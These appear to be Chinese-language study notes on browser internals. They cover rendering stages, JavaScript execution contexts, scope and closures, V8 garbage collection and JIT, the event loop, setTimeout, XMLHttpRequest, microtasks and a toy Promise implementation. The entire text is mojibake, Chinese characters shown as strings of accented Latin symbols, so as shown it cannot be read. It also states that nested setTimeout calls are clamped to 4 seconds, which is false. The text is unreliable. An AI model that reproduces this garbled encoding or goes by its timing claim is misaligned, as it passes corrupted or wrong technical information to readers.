æ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ æµè§ˆå™¨ä¸èƒ½ç›´æŽ¥ç†è§£ HTML æ•°æ®ï¼Œéœ€è¦å°†å…¶è½¬åŒ–ä¸º DOM æ ‘ç»“æž„ï¼› ç”Ÿæˆ DOM æ ‘åŽï¼Œæ ¹æ® CSS æ ·å¼è¡¨ï¼Œè®¡ç®—å‡º DOM æ ‘æ‰€æœ‰èŠ‚ç‚¹æ ·å¼ï¼› åˆ›å»ºå¸ƒå±€æ ‘ï¼šéåŽ† DOM æ ‘æ‰€æœ‰å¯è§èŠ‚ç‚¹ï¼ŒæŠŠè¿™äº›èŠ‚ç‚¹åŠ åˆ°å¸ƒå±€ä¸­ï¼Œä¸å¯è§èŠ‚ç‚¹å¿½ç•¥ï¼Œå¦‚ head æ ‡ç­¾ä¸‹æ‰€æœ‰å†…å®¹ï¼Œdisplay: none å…ƒç´ ï¼› æ¸²æŸ“æµç¨‹ï¼ˆä¸‹ï¼‰ï¼šHTMLã€CSS å’Œ JavaScript æ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ åˆ†å±‚ï¼šå±‚å ä¸Šä¸‹æ–‡å±žæ€§çš„å…ƒç´ ï¼ˆæ¯”å¦‚å®šä½å±žæ€§å…ƒç´ ã€é€æ˜Žå±žæ€§å…ƒç´ ã€CSS æ»¤é•œå±žæ€§å…ƒç´ ï¼‰æå‡ä¸ºå•ç‹¬çš„ä¸€å±‚ï¼Œéœ€è¦è£å‰ªçš„åœ°æ–¹ï¼ˆæ¯”å¦‚å‡ºçŽ°æ»šåŠ¨æ¡ï¼‰ä¹Ÿä¼šè¢«åˆ›å»ºä¸ºå›¾å±‚ï¼› å›¾å±‚ç»˜åˆ¶ï¼šå®Œæˆå›¾å±‚æ ‘æž„å»ºåŽï¼Œæ¸²æŸ“å¼•æ“Žä¼šå¯¹å›¾å±‚æ ‘æ¯ä¸€å±‚è¿›è¡Œç»˜åˆ¶ï¼ŒæŠŠä¸€ä¸ªå›¾å±‚æ‹†åˆ†æˆå°çš„ç»˜åˆ¶æŒ‡ä»¤ï¼Œå†æŠŠæŒ‡ä»¤æŒ‰ç…§é¡ºåºç»„æˆä¸€ä¸ªå¸¦ç»˜åˆ¶åˆ—è¡¨ï¼› æœ‰äº›æƒ…å†µå›¾å±‚å¾ˆå¤§ï¼Œä¸€æ¬¡ç»˜åˆ¶æ‰€æœ‰å›¾å±‚å†…å®¹ï¼Œå¼€é”€å¤ªå¤§ï¼Œåˆæˆçº¿ç¨‹ä¼šå°†å›¾å±‚åˆ’åˆ†ä¸ºå›¾å—ï¼ˆ256x256 æˆ–è€… 512x512ï¼‰ï¼› åˆæˆçº¿ç¨‹å°†å›¾å—æäº¤ç»™æ …æ ¼çº¿ç¨‹è¿›è¡Œæ …æ ¼åŒ–ï¼Œå°†å›¾å—è½¬æ¢ä¸ºä½å›¾ã€‚æ …æ ¼åŒ–è¿‡ç¨‹éƒ½ä¼šä½¿ç”¨ GPU åŠ é€Ÿï¼Œç”Ÿæˆçš„ä½å›¾ä¿å­˜åœ¨ GPU å†…å­˜ä¸­ï¼› ä¸€æ—¦æ‰€æœ‰å›¾å—éƒ½è¢«æ …æ ¼åŒ–ï¼Œåˆæˆçº¿ç¨‹ä¼šç”Ÿæˆä¸€ä¸ªç»˜åˆ¶å›¾å—å‘½ä»¤ï¼ˆDrawQuadï¼‰ï¼Œç„¶ä¼šå°†å‘½ä»¤æäº¤ç»™æµè§ˆå™¨è¿›ç¨‹ï¼Œviz ç»„ä»¶æŽ¥æ”¶åˆ°è¯¥æŒ‡ä»¤ï¼Œå°†é¡µé¢å†…å®¹ç»˜åˆ¶åˆ°å†…å­˜ä¸­ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼› é‡æŽ’ï¼šé€šè¿‡ JavaScript æˆ–è€… CSS ä¿®æ”¹å…ƒç´ å‡ ä½•ä½ç½®å±žæ€§ï¼Œä¼šè§¦å‘é‡æ–°å¸ƒå±€ï¼Œè§£æžåŽé¢ä¸€ç³»åˆ—å­é˜¶æ®µï¼›é‡ç»˜ï¼šä¸å¼•èµ·å¸ƒå±€å˜æ¢ï¼Œç›´æŽ¥è¿›å…¥ç»˜åˆ¶åŠå…¶ä»¥åŽå­é˜¶æ®µï¼›åˆæˆï¼šè·³è¿‡å¸ƒå±€å’Œç»˜åˆ¶é˜¶æ®µï¼Œæ‰§è¡Œçš„åŽç»­æ“ä½œï¼Œå‘ç”Ÿåœ¨åˆæˆçº¿ç¨‹ï¼Œéžä¸»çº¿ç¨‹ï¼› å˜é‡æå‡ï¼šjavascript ä»£ç æ˜¯æŒ‰é¡ºåºæ‰§è¡Œçš„å— JavaScript ä»£ç åœ¨æ‰§è¡Œä¹‹å‰éœ€è¦å…ˆç¼–è¯‘ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µï¼Œå˜é‡å’Œå‡½æ•°ä¼šè¢«å­˜æ”¾åˆ°å˜é‡çŽ¯å¢ƒä¸­ï¼Œå˜é‡é»˜è®¤å€¼ä¼šè¢«è®¾ç½®ä¸º undefinedï¼› åœ¨ä»£ç æ‰§è¡Œé˜¶æ®µï¼ŒJavaScript å¼•æ“Žä¼šä»Žå˜é‡çŽ¯å¢ƒä¸­æŸ¥æ‰¾è‡ªå®šä¹‰çš„å˜é‡å’Œå‡½æ•°ï¼› å¦‚æžœåœ¨ç¼–è¯‘é˜¶æ®µï¼Œçªœçˆ±ä¸¤ä¸ªç›¸åŒçš„å‡½æ•°ï¼Œé‚£ä¹ˆæœ€ç»ˆæ”¾åœ¨å˜é‡çŽ¯å¢ƒä¸­çš„æ˜¯æœ€åŽå®šä¹‰çš„é‚£ä¸ªï¼ŒåŽå®šä¹‰çš„è¦†ç›–å…ˆå®šä¹‰çš„ï¼› è°ƒç”¨æ ˆï¼šä¸ºä»€ä¹ˆ JavaScript ä»£ç ä¼šå‡ºçŽ°æ ˆæº¢å‡º æ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼ŒJavaScript å¼•æ“Žä¼šä¸ºå…¶åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡åŽ‹å…¥è°ƒç”¨æ ˆï¼Œç„¶åŽï¼ŒJavaScript å¼•æ“Žå¼€å§‹æ‰§è¡Œå‡½æ•°ä»£ç ã€‚ å¦‚æžœä¸€ä¸ªå‡½æ•° A è°ƒç”¨å¦å¤–ä¸€ä¸ªå‡½æ•° Bï¼Œé‚£ä¹ˆ JavaScript å¼•æ“Žä¼šä¸º B å‡½æ•°åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶å°† B å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡åŽ‹å…¥æ ˆé¡¶ã€‚ å½“å‰å‡½æ•°æ‰§è¡Œå®Œæ¯•åŽï¼ŒJavaScript å¼•æ“Žä¼šå°†è¯¥å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å¼¹å‡ºæ ˆã€‚ å½“åˆ†é…çš„è°ƒç”¨æ ˆç©ºé—´è¢«å æ»¡æ—¶ï¼Œä¼šå¼•å‘â€œå †æ ˆæº¢å‡ºâ€é—®é¢˜ã€‚ å—çº§ä½œç”¨åŸŸï¼švar ç¼ºé™·ä»¥åŠä¸ºä»€ä¹ˆè¦å¼•å…¥ let å’Œ const letã€const ç”³æ˜Žçš„å˜é‡ä¸ä¼šè¢«æå‡ã€‚åœ¨ javascript å¼•æ“Žç¼–è¯‘åŽï¼Œä¼šä¿å­˜åœ¨è¯æ³•çŽ¯å¢ƒä¸­ã€‚ å—çº§ä½œç”¨åŸŸåœ¨ä»£ç æ‰§è¡Œæ—¶ï¼Œå°† letã€const å˜é‡å­˜æ”¾åœ¨è¯æ³•çŽ¯å¢ƒçš„ä¸€ä¸ªå•ç‹¬çš„åŒºåŸŸã€‚è¯æ³•çŽ¯å¢ƒå†…éƒ¨ç»´æŠ¤ä¸€ä¸ªå°åž‹çš„æ ˆç»“æž„ï¼Œä½œç”¨åŸŸå†…éƒ¨å˜é‡åŽ‹å…¥æ ˆé¡¶ã€‚ä½œç”¨åŸŸæ‰§è¡Œå®Œï¼Œä»Žæ ˆé¡¶å¼¹å‡ºã€‚ ä½œç”¨åŸŸé“¾å’Œé—­åŒ…ï¼šä»£ç ä¸­å‡ºçŽ°ç›¸åŒçš„å˜é‡ï¼ŒJavaScript å¼•æ“Žå¦‚ä½•é€‰æ‹© ä½¿ç”¨ä¸€ä¸ªå˜é‡ï¼ŒJavaScript å¼•æ“Žä¼šåœ¨å½“å‰çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾å˜é‡ï¼Œå¦‚æžœæ²¡æœ‰æ‰¾åˆ°ï¼Œä¼šç»§ç»­åœ¨ outerï¼ˆæ‰§è¡ŒçŽ¯å¢ƒæŒ‡å‘å¤–éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡çš„å¼•ç”¨ï¼‰æ‰€æŒ‡å‘çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼› JavaScript æ‰§è¡Œè¿‡ç¨‹ï¼Œä½œç”¨åŸŸé“¾æ˜¯ç”±è¯æ³•ä½œç”¨åŸŸå†³å®šï¼Œè€Œè¯æ³•ä½œç”¨åŸŸæ˜¯ç”±ä»£ç ä¸­å‡½æ•°å£°æ˜Žçš„ä½ç½®å†³å®šï¼› æ ¹æ®è¯æ³•ä½œç”¨åŸŸçš„è§„åˆ™ï¼Œå†…éƒ¨å‡½æ•°æ€»æ˜¯å¯ä»¥è®¿é—®å…¶å¤–éƒ¨å‡½æ•°ä¸­å£°æ˜Žçš„å˜é‡ï¼Œå½“é€šè¿‡è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨å‡½æ•°è¿”å›žä¸€ä¸ªå†…éƒ¨å‡½æ•°åŽï¼Œå³ä½¿å¤–éƒ¨å‡½æ•°å·²ç»æ‰§è¡Œç»“æŸäº†ï¼Œä½†æ˜¯å†…éƒ¨å‡½æ•°å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å˜é‡ä¾æ—§ä¿å­˜åœ¨å†…å­˜ä¸­ï¼ŒæŠŠè¿™äº›å˜é‡çš„é›†åˆç§°ä¸ºé—­åŒ…ï¼› thisï¼šä»Ž JavaScript æ‰§è¡Œä¸Šä¸‹æ–‡è§†è§’è®² thiså½“æ‰§è¡Œ new CreateObj çš„æ—¶å€™ï¼ŒJavaScript å¼•æ“Žåšäº†å››ä»¶äº‹ï¼š é¦–å…ˆåˆ›å»ºä¸€ä¸ªæŽ§å¯¹è±¡ tempObjï¼› æŽ¥ç€è°ƒç”¨ CreateObj.call æ–¹æ³•ï¼Œå¹¶å°† tempObj ä½œä¸º call æ–¹æ³•çš„å‚æ•°ï¼Œè¿™æ ·å½“ createObj çš„æ‰§è¡Œä¸Šä¸‹æ–‡åˆ›å»ºæ—¶ï¼Œå®ƒçš„ this å°±æŒ‡å‘ tempObj å¯¹è±¡ï¼› ç„¶åŽæ‰§è¡Œ CreateObj å‡½æ•°ï¼Œæ­¤æ—¶çš„ CreateObj å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„ this æŒ‡å‘ tempObj å¯¹è±¡ï¼› æœ€åŽè¿”å›ž tempObj å¯¹è±¡ã€‚ this çš„ä½¿ç”¨åˆ†ä¸ºï¼š å½“å‡½æ•°æœ€ä¸ºå¯¹è±¡çš„æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå‡½æ•°ä¸­çš„ this å°±æ˜¯è¯¥å¯¹è±¡ï¼› å½“å‡½æ•°è¢«æ­£å¸¸è°ƒç”¨æ—¶ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œthis å€¼æ˜¯ undefinedï¼Œéžä¸¥æ ¼æ¨¡å¼ä¸‹ this æŒ‡å‘çš„æ˜¯å…¨å±€å¯¹è±¡ windowï¼› åµŒå¥—å‡½æ•°ä¸­çš„ this ä¸ä¼šç»§æ‰¿å¤–å±‚å‡½æ•°çš„ this å€¼ï¼› ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œthis æ˜¯å¤–å±‚å‡½æ•°çš„ thisã€‚ æ ˆç©ºé—´å’Œå †ç©ºé—´ï¼šæ•°æ®æ˜¯å¦‚ä½•å­˜å‚¨çš„åŠ¨æ€è¯­è¨€ï¼šåœ¨ä½¿ç”¨æ—¶éœ€è¦æ£€æŸ¥æ•°æ®ç±»åž‹çš„è¯­è¨€ã€‚å¼±ç±»åž‹è¯­è¨€ï¼šæ”¯æŒéšå¼è½¬æ¢çš„è¯­è¨€ã€‚ JavaScript ä¸­çš„ 8 ç§æ•°æ®ç±»åž‹ï¼Œå®ƒä»¬å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»â€”â€”åŽŸå§‹ç±»åž‹å’Œå¼•ç”¨ç±»åž‹ã€‚åŽŸå§‹ç±»åž‹æ•°æ®å­˜æ”¾åœ¨æ ˆä¸­ï¼Œå¼•ç”¨ç±»åž‹æ•°æ®å­˜æ”¾åœ¨å †ä¸­ã€‚å †ä¸­çš„æ•°æ®æ˜¯é€šè¿‡å¼•ç”¨ä¸Žå˜é‡å…³ç³»è”ç³»èµ·æ¥çš„ã€‚ ä»Žå†…å­˜è§†è§’äº†è§£é—­åŒ…ï¼šè¯æ³•æ‰«æå†…éƒ¨å‡½æ•°ï¼Œå¼•ç”¨äº†å¤–éƒ¨å‡½æ•°å˜é‡ï¼Œå †ç©ºé—´åˆ›å»ºä¸€ä¸ªâ€œclosureâ€å¯¹è±¡ï¼Œä¿å­˜å˜é‡ã€‚ åžƒåœ¾å›žæ”¶ï¼šåžƒåœ¾æ•°æ®å¦‚ä½•è‡ªåŠ¨å›žæ”¶ æ ˆä¸­æ•°æ®å›žæ”¶ï¼šæ‰§è¡ŒçŠ¶æ€æŒ‡é’ˆ ESP åœ¨æ‰§è¡Œæ ˆä¸­ç§»åŠ¨ï¼Œç§»è¿‡æŸæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå°±ä¼šè¢«é”€æ¯ï¼› å †ä¸­æ•°æ®å›žæ”¶ï¼šV8 å¼•æ“Žé‡‡ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼› V8 æŠŠå †åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸâ€”â€”æ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ï¼Œåˆ†åˆ«ä½¿ç”¨å‰¯ã€ä¸»åžƒåœ¾å›žæ”¶å™¨ï¼› å‰¯åžƒåœ¾å›žæ”¶å™¨è´Ÿè´£æ–°ç”Ÿä»£åžƒåœ¾å›žæ”¶ï¼Œå°å¯¹è±¡ï¼ˆ1 ï½ž 8Mï¼‰ä¼šè¢«åˆ†é…åˆ°è¯¥åŒºåŸŸå¤„ç†ï¼› æ–°ç”Ÿä»£é‡‡ç”¨ scavenge ç®—æ³•å¤„ç†ï¼šå°†æ–°ç”Ÿä»£ç©ºé—´åˆ†ä¸ºä¸¤åŠï¼Œä¸€åŠç©ºé—²ï¼Œä¸€åŠå­˜å¯¹è±¡ï¼Œå¯¹å¯¹è±¡åŒºåŸŸåšæ ‡è®°ï¼Œå­˜æ´»å¯¹è±¡å¤åˆ¶æŽ’åˆ—åˆ°ç©ºé—²åŒºåŸŸï¼Œæ²¡æœ‰å†…å­˜ç¢Žç‰‡ï¼Œå®ŒæˆåŽï¼Œæ¸…ç†å¯¹è±¡åŒºåŸŸï¼Œè§’è‰²åè½¬ï¼› æ–°ç”Ÿä»£åŒºåŸŸä¸¤æ¬¡åžƒåœ¾å›žæ”¶è¿˜å­˜æ´»çš„å¯¹è±¡æ™‹å‡è‡³è€ç”Ÿä»£åŒºåŸŸï¼› ä¸»åžƒåœ¾å›žæ”¶å™¨è´Ÿè´£è€ç”ŸåŒºåžƒåœ¾å›žæ”¶ï¼Œå¤§å¯¹è±¡ï¼Œå­˜æ´»æ—¶é—´é•¿ï¼› è€ç”Ÿä»£åŒºåŸŸé‡‡ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•å›žæ”¶åžƒåœ¾ï¼šä»Žæ ¹å…ƒç´ å¼€å§‹ï¼Œé€’å½’ï¼Œå¯åˆ°è¾¾çš„å…ƒç´ æ´»åŠ¨å…ƒç´ ï¼Œå¦åˆ™æ˜¯åžƒåœ¾æ•°æ®ï¼› æ ‡è®°-æ¸…é™¤ç®—æ³•åŽï¼Œä¼šäº§ç”Ÿå¤§é‡ä¸è¿žç»­çš„å†…å­˜ç¢Žç‰‡ï¼Œæ ‡è®°-æ•´ç†ç®—æ³•è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åŽæ¸…ç†æŽ‰è¾¹ç•Œä»¥å¤–çš„å†…å­˜ï¼› ä¸ºé™ä½Žè€ç”Ÿä»£åžƒåœ¾å›žæ”¶é€ æˆçš„å¡é¡¿ï¼ŒV8 å°†æ ‡è®°è¿‡ç¨‹è¢«åˆ‡åˆ†ä¸ºä¸€ä¸ªä¸ªå­æ ‡è®°è¿‡ç¨‹ï¼Œè®©åžƒåœ¾å›žæ”¶å’Œ JavaScript æ‰§è¡Œäº¤æ›¿è¿›è¡Œã€‚ ç¼–è¯‘å™¨å’Œè§£æžå™¨ï¼šV8 å¦‚ä½•æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç çš„ è®¡ç®—æœºè¯­è¨€å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç¼–è¯‘åž‹å’Œè§£é‡Šåž‹è¯­è¨€ã€‚ç¼–è¯‘åž‹è¯­è¨€ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘åŽä¿ç•™æœºå™¨èƒ½è¯»æ‡‚çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯”å¦‚ C/C++ï¼Œgo è¯­è¨€ã€‚è§£é‡Šåž‹è¯­è¨€æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶é€šè¿‡è§£é‡Šå™¨å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è§£é‡Šå’Œæ‰§è¡Œï¼Œæ¯”å¦‚ Pythonï¼ŒJavaScript è¯­è¨€ã€‚ ç¼–è¯‘åž‹è¯­è¨€çš„ç¼–è¯‘è¿‡ç¨‹ï¼šç¼–è¯‘å™¨é¦–å…ˆå°†ä»£ç è¿›è¡Œè¯æ³•åˆ†æžã€è¯­æ³•åˆ†æžï¼Œç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œç„¶åŽä¼˜åŒ–ä»£ç ï¼Œæœ€åŽç”Ÿæˆå¤„ç†å™¨èƒ½å¤Ÿç†è§£çš„æœºå™¨ç ï¼› è§£é‡Šåž‹è¯­è¨€è§£é‡Šè¿‡ç¨‹ï¼šè§£é‡Šå™¨ä¼šå¯¹ä»£ç è¿›è¡Œè¯æ³•åˆ†æžã€è¯­æ³•åˆ†æžï¼Œå¹¶ç”Ÿäº§æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œä¸è¿‡å®ƒä¼šå†åŸºäºŽæŠ½è±¡è¯­æ³•æ ‘ç”Ÿæˆå­—èŠ‚ç ï¼Œæœ€åŽæ ¹æ®å­—èŠ‚ç æ‰§è¡Œç¨‹åºï¼› AST çš„ç”Ÿæˆï¼šç¬¬ä¸€é˜¶æ®µæ˜¯åˆ†è¯ï¼ˆè¯æ³•åˆ†æžï¼‰ï¼Œå°†ä¸€è¡Œè¡Œæºç æ‹†è§£æˆä¸€ä¸ªä¸ª tokenï¼ˆè¯­æ³•ä¸Šä¸å¯å†åˆ†ã€æœ€å°å•ä¸ªå­—ç¬¦ï¼‰ã€‚ç¬¬äºŒé˜¶æ®µæ˜¯è§£æžï¼ˆè¯­æ³•åˆ†æžï¼‰ï¼Œå°†ä¸Šä¸€æ­¥ç”Ÿæˆçš„ token æ•°æ®ï¼Œæ ¹æ®è¯­æ³•è§„åˆ™è½¬ä¸º ASTï¼Œè¿™ä¸€é˜¶æ®µä¼šæ£€æŸ¥è¯­æ³•é”™è¯¯ï¼› å­—èŠ‚ç å­˜åœ¨çš„æ„ä¹‰ï¼šç›´æŽ¥å°† AST è½¬åŒ–ä¸ºæœºå™¨ç ï¼Œæ‰§è¡Œæ•ˆçŽ‡æ˜¯éžå¸¸é«˜ï¼Œä½†æ˜¯æ¶ˆè€—å¤§é‡å†…å­˜ï¼Œä»Žè€Œå…ˆè½¬åŒ–ä¸ºå­—èŠ‚ç è§£å†³å†…å­˜é—®é¢˜ï¼› è§£é‡Šå™¨ ignition åœ¨è§£é‡Šæ‰§è¡Œå­—èŠ‚ç ï¼ŒåŒæ—¶ä¼šæ‰‹æœºä»£ç ä¿¡æ¯ï¼Œå‘çŽ°æŸä¸€éƒ¨åˆ†ä»£ç æ˜¯çƒ­ç‚¹ä»£ç ï¼ˆHotSpotï¼‰ï¼Œç¼–è¯‘å™¨æŠŠçƒ­ç‚¹çš„å­—èŠ‚ç è½¬åŒ–ä¸ºæœºå™¨ç ï¼Œå¹¶ä¿å­˜èµ·æ¥ï¼Œä¸‹æ¬¡ä½¿ç”¨ï¼› å­—èŠ‚ç é…åˆè§£é‡Šå™¨å’Œç¼–è¯‘å™¨çš„å®žçŽ°ç§°ä¸ºå³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰ã€‚ æ¶ˆæ¯é˜Ÿåˆ—å’Œäº‹ä»¶å¾ªçŽ¯ï¼šé¡µé¢æ˜¯æ€Žä¹ˆæ´»èµ·æ¥çš„ æ¯ä¸ªæ¸²æŸ“è¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œä¸»çº¿ç¨‹ä¼šå¤„ç† DOMï¼Œè®¡ç®—æ ·å¼ï¼Œå¤„ç†å¸ƒå±€ï¼ŒJavaScript ä»»åŠ¡ä»¥åŠå„ç§è¾“å…¥äº‹ä»¶ï¼› ç»´æŠ¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ–°ä»»åŠ¡ï¼ˆæ¯”å¦‚ IO çº¿ç¨‹ï¼‰æ·»åŠ åˆ°æ¶ˆæ¯é˜Ÿåˆ—å°¾éƒ¨ï¼Œä¸»çº¿ç¨‹å¾ªçŽ¯åœ°ä»Žæ¶ˆæ¯é˜Ÿåˆ—å¤´éƒ¨è¯»å–ä»»åŠ¡ï¼Œæ‰§è¡Œä»»åŠ¡ï¼› è§£å†³å¤„ç†ä¼˜å…ˆçº§é«˜çš„ä»»åŠ¡ï¼šæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸­çš„ä»»åŠ¡ç§°ä¸ºå®ä»»åŠ¡ï¼Œæ¯ä¸ªå®ä»»åŠ¡ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œåœ¨æ‰§è¡Œå®ä»»åŠ¡çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æžœ DOM æœ‰å˜åŒ–ï¼Œå°†è¯¥å˜åŒ–æ·»åŠ åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼› è§£å†³å•ä¸ªä»»åŠ¡æ‰§è¡Œæ—¶é•¿è¿‡ä¹…ï¼šJavaScript é€šè¿‡å›žè°ƒåŠŸèƒ½æ¥è§„é¿ã€‚ webapiï¼šsetTimeout æ˜¯æ€Žä¹ˆå®žçŽ°çš„ JavaScript è°ƒç”¨ setTimeout è®¾ç½®å›žè°ƒå‡½æ•°çš„æ—¶å€™ï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šåˆ›å»ºä¸€ä¸ªå›žè°ƒä»»åŠ¡ï¼Œå»¶æ—¶æ‰§è¡Œé˜Ÿåˆ—å­˜æ”¾å®šæ—¶å™¨ä»»åŠ¡ï¼› å½“å®šæ—¶å™¨ä»»åŠ¡åˆ°æœŸï¼Œå°±ä¼šä»Žå»¶æ—¶é˜Ÿåˆ—ä¸­å–å‡ºå¹¶æ‰§è¡Œï¼› å¦‚æžœå½“å‰ä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡ä¹…ï¼Œä¼šå½±å“å»¶æ—¶åˆ°æœŸå®šæ—¶å™¨ä»»åŠ¡çš„æ‰§è¡Œï¼› å¦‚æžœ setTimeout å­˜åœ¨åµŒå¥—è°ƒç”¨ï¼ˆ5 æ¬¡ä»¥ä¸Šï¼‰ï¼Œåˆ¤æ–­è¯¥å‡½æ•°æ–¹æ³•è¢«é˜»å¡žï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè®¾ç½®æœ€çŸ­æ—¶é—´é—´éš”ä¸º 4 ç§’ï¼› æœªæ¿€æ´»çš„é¡µé¢ï¼ŒsetTimeout æ‰§è¡Œæœ€å°é—´éš”æ˜¯ 1000 æ¯«ç§’ï¼Œç›®çš„æ˜¯ä¸ºäº†é™ä½ŽåŠ è½½æŸè€—ï¼› å»¶æ—¶æ‰§è¡Œæ—¶é—´æœ€å¤§å€¼æ˜¯ 24.8 å¤©ï¼Œå› ä¸ºå»¶æ—¶å€¼æ˜¯ä»¥ 32 ä¸ª bit å­˜å‚¨çš„ï¼› setTimeout è®¾ç½®çš„å›žè°ƒå‡½æ•°ä¸­çš„ this æŒ‡å‘å…¨å±€ windowã€‚ webpaiï¼šXMLHttpRequest æ˜¯æ€Žä¹ˆå®žçŽ°çš„ XMLHttpRequest onreadystatechange å¤„ç†æµç¨‹ï¼šæœªåˆå§‹åŒ– -&gt; OPENED -&gt; HEADERS_RECEIVED -&gt; LOADING -&gt; DONEï¼› æ¸²æŸ“è¿›ç¨‹ä¼šå°†è¯·æ±‚å‘é€ç»™ç½‘ç»œè¿›ç¨‹ï¼Œç„¶åŽç½‘ç»œè¿›ç¨‹è´Ÿè´£èµ„æºä¸‹è½½ï¼Œç­‰ç½‘ç»œè¿›ç¨‹æŽ¥æ”¶åˆ°æ•°æ®åŽï¼Œåˆ©ç”¨ IPC é€šçŸ¥æ¸²æŸ“è¿›ç¨‹ï¼› æ¸²æŸ“è¿›ç¨‹æŽ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹åŽï¼Œä¼šå°† xhr å›žè°ƒå‡½æ•°å°è£…æˆä»»åŠ¡å¹¶æ·»åŠ åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç­‰ä¸»çº¿ç¨‹å¾ªçŽ¯ç³»ç»Ÿæ‰§è¡Œåˆ°è¯¥ä»»åŠ¡çš„æ—¶å€™ï¼Œä¼šæ ¹æ®ç›¸å…³çŠ¶æ€æ¥è°ƒç”¨å›žè°ƒå‡½æ•°ã€‚ å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ï¼šä¸æ˜¯æ‰€æœ‰çš„ä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªå¾…é‡ æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ä¸ºå®ä»»åŠ¡ã€‚æ¸²æŸ“è¿›ç¨‹å†…éƒ¨ä¼šç»´æŠ¤å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ¯”å¦‚å»¶æ—¶æ‰§è¡Œé˜Ÿåˆ—å’Œæ™®é€šæ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸»çº¿ç¨‹é‡‡ç”¨ for å¾ªçŽ¯ï¼Œä¸æ–­åœ°ä»Žè¿™äº›ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºä»»åŠ¡å¹¶æ‰§è¡Œï¼› å¾®ä»»åŠ¡æ˜¯ä¸€ä¸ªéœ€è¦å¼‚æ­¥æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰§è¡Œæ—¶æœºæ˜¯åœ¨ä¸»å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åŽã€å½“å‰å®ä»»åŠ¡ç»“æŸä¹‹å‰ï¼› V8 åœ¨æ‰§è¡Œ javascript è„šæœ¬æ—¶ï¼Œä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ŒåŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼› æ‰§è¡Œå¾®ä»»åŠ¡è¿‡ç¨‹ä¸­äº§ç”Ÿçš„å¾®ä»»åŠ¡ä¸ä¼šæŽ¨è¿Ÿåˆ°ä¸‹ä¸ªå®ä»»åŠ¡ä¸­æ‰§è¡Œï¼Œè€Œæ˜¯åœ¨å½“å‰å®ä»»åŠ¡ä¸­ç»§ç»­æ‰§è¡Œï¼› ä½¿ç”¨ Promise å‘Šåˆ«å›žè°ƒå‡½æ•° ä½¿ç”¨ Promise è§£å†³äº†å›žè°ƒåœ°ç‹±é—®é¢˜ï¼Œæ¶ˆç­åµŒå¥—å’Œå¤šæ¬¡å¤„ç†ï¼› æ¨¡æ‹Ÿå®žçŽ° Promise 123456789101112function Bromise(executor) &#123; var _onResolve = null this.then = function (onResolve) &#123; _onResolve = onResolve &#125; function resolve(value) &#123; setTimeout(() =&gt; &#123; _onResolve(value) &#125;, 0) &#125; executor(resolve, null)&#125; async await ä½¿ç”¨åŒæ­¥æ–¹å¼å†™å¼‚æ­¥ä»£ç  